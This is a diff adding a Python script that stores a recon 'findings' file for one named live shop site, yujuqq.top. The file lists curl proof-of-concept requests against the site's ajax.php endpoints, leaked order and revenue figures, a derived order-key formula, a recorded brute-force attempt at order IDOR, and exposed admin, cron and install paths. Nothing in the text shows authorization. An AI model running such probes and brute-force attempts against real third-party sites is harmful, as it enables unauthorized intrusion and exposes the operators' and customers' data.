@@ -1,0 +1,109 @@
+#!/usr/bin/env python3
+"""将 yujuqq.top 漏洞清单写入 recon 结构（本地或 /data/recon/）。"""
+from __future__ import annotations
+
+import json
+from datetime import datetime, timezone
+from pathlib import Path
+
+TARGET = "https://yujuqq.top/shop/"
+DOMAIN = "yujuqq.top"
+TS = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
+
+FINDINGS = [
+    {
+        "id": "Y1",
+        "severity": "HIGH",
+        "category": "info_disclosure",
+        "title": "getcount 未授权泄露经营数据",
+        "detail": "orders=280 money=38814.9 site=22 yxts=255；需首页会话后 ajax 可访问",
+        "endpoint": "GET /shop/ajax.php?act=getcount",
+        "exploitable": True,
+        "poc": 'curl -sk -c ck -b ck -H "X-Requested-With: XMLHttpRequest" -H "Referer: https://yujuqq.top/shop/" "https://yujuqq.top/shop/ajax.php?act=getcount"',
+        "evidence": {
+            "orders": "280",
+            "orders1": "280",
+            "money": 38814.9,
+            "site": "22",
+            "yxts": 255,
+        },
+        "ts": TS,
+    },
+    {
+        "id": "Y2",
+        "severity": "HIGH",
+        "category": "idor",
+        "title": "order 卡密 IDOR（需 skey，kminfo 未抓到）",
+        "detail": "POST ajax.php?act=order {id,skey}；skey=md5(id+SYS_KEY+id)；10k 词×280 id 爆破暂无命中",
+        "endpoint": "POST /shop/ajax.php?act=order",
+        "exploitable": False,
+        "poc": 'curl -sk -X POST -d "id=1&skey=test" -H "Referer: https://yujuqq.top/shop/?mod=query" "https://yujuqq.top/shop/ajax.php?act=order"',
+        "evidence": {"response": "验证失败", "skey_formula": "md5(id+SYS_KEY+id)", "kminfo_captured": False},
+        "ts": TS,
+    },
+    {
+        "id": "Y3",
+        "severity": "MEDIUM",
+        "category": "availability",
+        "title": "ajax query 接口 HTTP 500",
+        "detail": "POST act=query type+qq 全类型 500；阻断 queryOrder JSON 泄露 skey 主路径",
+        "endpoint": "POST /shop/ajax.php?act=query",
+        "exploitable": False,
+        "evidence": {"http_status": 500},
+        "ts": TS,
+    },
+    {
+        "id": "Y4",
+        "severity": "HIGH",
+        "category": "idor",
+        "title": "api.php search 疑似 IDOR（GET 被封）",
+        "detail": "彩虹源码 act=search&id= 无鉴权；本站 GET api.php 连接重置，POST 返回 No Act",
+        "endpoint": "GET /shop/api.php?act=search&id=",
+        "exploitable": False,
+        "evidence": {"get": "connection reset", "post": '{"code":-5,"msg":"No Act!"}'},
+        "ts": TS,
+    },
+    {
+        "id": "Y5",
+        "severity": "MEDIUM",
+        "category": "exposure",
+        "title": "后台/安装/定时任务面暴露",
+        "detail": "sup/user 登录页、cron.php、install（已锁）、other/submit.php 公网可达",
+        "endpoint": "/shop/sup/, /shop/cron.php, /shop/install/",
+        "exploitable": False,
+        "evidence": {"cron": "监控密钥不正确", "install": "install.lock 存在"},
+        "ts": TS,
+    },
+    {
+        "id": "Y6",
+        "severity": "LOW",
+        "category": "catalog",
+        "title": "商品目录未授权枚举",
+        "detail": "getclass/gettool 可列出 QQ/飞机/美卡类商品与价格",
+        "endpoint": "GET /shop/ajax.php?act=getclass|gettool",
+        "exploitable": True,
+        "evidence": {"sample_cids": ["89", "35", "36", "8", "7"], "sample_tid": 1257, "price": 140},
+        "ts": TS,
+    },
+]
+
+
+def main() -> None:
+    payload = {"target": TARGET, "domain": DOMAIN, "updated": TS, "findings": FINDINGS}
+    paths = [Path("/data/recon") / DOMAIN / "rev" / "audit", Path("recon") / DOMAIN / "rev" / "audit"]
+    wrote = False
+    for base in paths:
+        try:
+            base.mkdir(parents=True, exist_ok=True)
+            out = base / "findings.json"
+            out.write_text(json.dumps(payload, ensure_ascii=False, indent=2))
+            print(f"wrote {out} ({len(FINDINGS)} findings)")
+            wrote = True
+        except (OSError, PermissionError) as e:
+            print(f"skip {base}: {e}")
+    if not wrote:
+        raise SystemExit("no writable recon path")
+
+
+if __name__ == "__main__":
+    main()
